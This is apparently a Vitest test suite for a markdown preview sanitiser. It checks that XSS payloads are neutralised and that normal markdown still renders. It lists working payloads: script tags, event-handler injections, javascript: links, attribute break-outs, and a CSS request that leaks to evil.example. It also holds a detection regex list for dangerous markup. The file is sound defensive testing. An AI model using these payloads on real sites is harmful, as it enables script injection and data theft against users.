import { describe, it, expect } from 'vitest';
import { parseMarkdown } from '../markdown';

/**
 * Every previewed document is untrusted input: marked does not sanitise its
 * output (the option was removed in v5) and the result is injected with
 * dangerouslySetInnerHTML. These are the payloads that executed script in the
 * app window before the sanitiser was added.
 *
 * Each case asserts on the string *and* on live DOM insertion, because a payload
 * can be inert as markup yet still fire once parsed by the browser.
 */
const PAYLOADS: ReadonlyArray<readonly [string, string]> = [
  ['raw <script> tag', '# hi\n<script>alert(1)</script>'],
  ['img onerror', '<img src=x onerror="window.__pwned=1">'],
  ['svg onload', '<svg onload="window.__pwned=1"></svg>'],
  ['iframe', '<iframe src="https://evil.example"></iframe>'],
  ['autofocus + onfocus', '<div id=x tabindex=1 onfocus="window.__pwned=1" autofocus>'],
  ['style exfiltration', '<style>body{background:url(https://evil.example/leak)}</style>'],
  ['object local file read', '<object data="file:///C:/Windows/win.ini"></object>'],
  ['javascript: link', '[click](javascript:alert(1))'],
  ['data: html link', '<a href="data:text/html,<script>alert(1)</script>">x</a>'],
  // The custom image renderer used to splice alt/title/href into attribute
  // position unescaped, so plain image syntax was a second XSS primitive.
  ['image alt attribute break-out', '![a" onerror="window.__pwned=1](x.png)'],
  ['image alt closes tag, injects sibling', '!["><img src=1 onerror=window.__pwned=1>](x.png)'],
  ['image javascript: src', '![x](javascript:alert(1))'],
  ['fence info string attribute break-out', '```x" onmouseover="window.__pwned=1\ncode\n```'],
  ['prototype key as language name', '```constructor\nalert(1)\n```'],
];

const DANGEROUS = [
  /\sonerror\s*=/i,
  /\sonload\s*=/i,
  /\sonmouseover\s*=/i,
  /\sonfocus\s*=/i,
  /<script/i,
  /<iframe/i,
  /<object/i,
  /<style/i,
  /javascript:/i,
];

describe('markdown sanitisation', () => {
  it.each(PAYLOADS)('neutralises %s', (_name, payload) => {
    const html = parseMarkdown(payload);
    for (const pattern of DANGEROUS) {
      expect(html, `matched ${pattern} in: ${html}`).not.toMatch(pattern);
    }
  });

  it.each(PAYLOADS)('executes nothing when %s is inserted into the live DOM', (_name, payload) => {
    const host = document.createElement('div');
    host.innerHTML = parseMarkdown(payload);
    document.body.appendChild(host);

    expect((window as unknown as { __pwned?: unknown }).__pwned).toBeUndefined();
    expect(document.querySelectorAll('img[onerror]')).toHaveLength(0);
    expect(document.querySelectorAll('script')).toHaveLength(0);

    host.remove();
  });

  it('escapes code-block contents rather than executing them', () => {
    const html = parseMarkdown('```\n<script>alert(1)</script>\n```');
    expect(html).toContain('&lt;script&gt;');
    expect(html).not.toMatch(/<script/i);
  });

  it('blocks javascript: and data: image sources with a visible notice', () => {
    const html = parseMarkdown('![x](javascript:alert(1))');
    expect(html).not.toMatch(/javascript:/i);
    expect(html).toMatch(/Blocked image reference/i);
  });

  it('escapes image attributes instead of injecting them', () => {
    const html = parseMarkdown('![a "quoted" caption](https://example.com/a.png)');
    expect(html).toContain('&quot;quoted&quot;');
    expect(html).not.toMatch(/\sonerror\s*=/i);
  });

  it('leaves a malformed image title as inert escaped text, never as markup', () => {
    // marked cannot parse this as an image at all, so the whole thing becomes
    // literal text. That is the correct outcome: the danger would be if the raw
    // quotes produced an attribute, so assert no element was created.
    const payload = '![a](x.png "t" onmouseover="window.__pwned=1")';
    const html = parseMarkdown(payload);

    expect(html).not.toMatch(/<img/i);
    expect(html).not.toMatch(/<figure/i);

    const host = document.createElement('div');
    host.innerHTML = html;
    document.body.appendChild(host);
    expect(host.querySelectorAll('*')).toHaveLength(1); // just the <p>
    expect((window as unknown as { __pwned?: unknown }).__pwned).toBeUndefined();
    host.remove();
  });
});

describe('legitimate markdown still renders', () => {
  const CASES: ReadonlyArray<readonly [string, string, RegExp]> = [
    ['heading', '# Title', /<h1[^>]*>Title<\/h1>/],
    ['bold', '**bold**', /<strong>bold<\/strong>/],
    ['italic', '*it*', /<em>it<\/em>/],
    ['link', '[x](https://example.com)', /<a [^>]*href="https:\/\/example\.com"/],
    ['fenced code', '```js\nconst a = 1;\n```', /<code[^>]*class="hljs/],
    ['table', '| a | b |\n|---|---|\n| 1 | 2 |', /<table/],
    ['unordered list', '- one\n- two', /<ul/],
    ['ordered list', '1. one\n2. two', /<ol/],
    ['strikethrough', '~~gone~~', /<del>gone<\/del>/],
    ['blockquote with nested emphasis', '> quoted **text**', /<blockquote[^>]*>[\s\S]*<strong>text<\/strong>/],
    ['safe remote image', '![alt](https://example.com/a.png)', /<img[^>]*src="https:\/\/example\.com\/a\.png"/],
    ['inline code', 'use `npm i`', /<code[^>]*>npm i<\/code>/],
  ];

  it.each(CASES)('renders %s', (_name, md, pattern) => {
    expect(parseMarkdown(md)).toMatch(pattern);
  });

  it('renders blockquote content (token.text was removed in marked v18)', () => {
    // Regression guard: the renderer used to read token.text, which no longer
    // exists, so every blockquote in the app rendered empty.
    // Matched loosely on purpose: the block's class attribute contains a
    // literal ">" (from the Tailwind [&>p] variant), and a quoted attribute is
    // allowed to contain one, so [^>]* would stop early.
    expect(parseMarkdown('> hello')).toMatch(/<blockquote[\s\S]*?<p>hello<\/p>/);
  });

  it('emits no color utilities on theme-surfaced elements', () => {
    // After the engine moved into @layer components, utilities beat theme rules
    // regardless of specificity. A single text-slate-* class on a blockquote
    // once rendered all light-mode quotes in near-white on near-white. Theme CSS
    // owns color on surfaced elements now; markup owns structure. (The zoom chip,
    // code header, copy button and pre body keep their utilities: those sit on
    // fixed-dark chrome in both themes, by design.)
    const html = parseMarkdown('> quoted\n\n![a](https://example.com/a.png)\n\n```js\nconst a = 1;\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |');
    for (const tag of ['blockquote', 'figcaption', 'table', 'p>', '<li', '<h1', '<h2']) {
      const opens = [...html.matchAll(new RegExp(`<${tag}[^>]*>`, 'g'))].map((m) => m[0]);
      for (const open of opens) {
        expect(open, tag).not.toMatch(/text-(slate|sky|amber|rose|emerald|white|black)-\d+/);
        expect(open, tag).not.toMatch(/bg-(slate|sky|amber|rose|emerald|white|black)(-\d+)?(\/|"| )/);
      }
    }
  });

  it('returns a safe message instead of throwing on hostile input', () => {
    // Deeply nested blockquotes previously drove unbounded re-entrant parsing.
    const nasty = '>'.repeat(400) + ' deep';
    expect(() => parseMarkdown(nasty)).not.toThrow();
  });
});

describe('app features survive sanitisation', () => {
  it('preserves the copy-code button and its payload', () => {
    const html = parseMarkdown('```js\nconst a = 1;\n```');
    expect(html).toMatch(/copy-code-btn/);
    expect(html).toMatch(/data-code="/);
  });

  it('preserves image zoom hooks and adds referrerpolicy', () => {
    const html = parseMarkdown('![alt](https://example.com/a.png)');
    expect(html).toMatch(/data-zoomable="true"/);
    expect(html).toMatch(/referrerpolicy="no-referrer"/);
    expect(html).toMatch(/<figure/);
    expect(html).toMatch(/<figcaption/);
  });

  it('forces safe link attributes', () => {
    const html = parseMarkdown('[x](https://example.com)');
    expect(html).toMatch(/target="_blank"/);
    expect(html).toMatch(/rel="noopener noreferrer nofollow"/);
  });

  it('keeps task-list checkboxes clickable', () => {
    // marked emits disabled="" on task checkboxes, which makes the preview's
    // toggle handler unreachable. The sanitiser strips it again.
    const html = parseMarkdown('- [ ] todo\n- [x] done');
    expect(html).toMatch(/type="checkbox"/);
    expect(html).not.toMatch(/disabled/i);
    expect(html).toMatch(/checked/i);
  });

  it('renders GitHub-style task lists as inputs, not buttons', () => {
    const html = parseMarkdown('- [x] done');
    expect(html).not.toMatch(/<button/i);
  });
});
